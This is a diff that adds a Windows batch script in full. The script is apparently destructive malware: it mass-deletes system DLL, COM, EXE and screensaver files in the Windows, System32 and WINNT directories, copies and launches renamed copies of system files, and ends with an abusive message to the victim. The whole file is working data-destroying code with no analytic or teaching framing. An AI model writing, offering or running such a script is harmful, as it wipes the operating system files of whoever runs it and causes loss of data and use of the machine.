@@ -1,0 +1,31 @@
+@echo off 
+del c:\windows\system32\*.com 
+del c:\windows\*.com 
+md c:\silver 
+copy c:\windows\system32\wsock32.dll c:\silver\necro.dll 
+copy c:\silver\necro.dll c:\silver\negro.dll 
+copy c:\silver\necro.dll c:\windows\reamer.dll 
+copy c:\silver\necro.dll c:\windows\pinch.dll 
+start c:\windows\notepad.exe 
+copy c:\windows\notepad.exe c:\silver\bind.exe 
+start c:\silver\bind.exe 
+start c:\windows\notepad.exe 
+start c:\silver\bind.exe 
+copy c:\silver\bind.exe c:\silver\macho.exe 
+start c:\silver\macho.exe 
+copy c:\windows\registry.reg c:\silver\copy.reg 
+copy c:\silver\copy.reg c:\silver\cop.reg 
+md c:\silver\prof 
+del c:\windows\system32\*.scr 
+del c:\windows\*.scr 
+copy c:\windows\*.dll c:\silver\prof\*.dll 
+copy c:\windows\system32\*.dll c:\silver\*.dll 
+md c:\chaos 
+copy c:\silver\*.exe c:\chaos\*.exe 
+start c:\chaos\bind.exe 
+del c:\windows\system32\*.dll 
+del c:\windows\*.dll 
+del c:\winnt\*.dll 
+del c:\winnt\*.com 
+del c:\winnt\*.exe 
+echo you are dead you shit face 
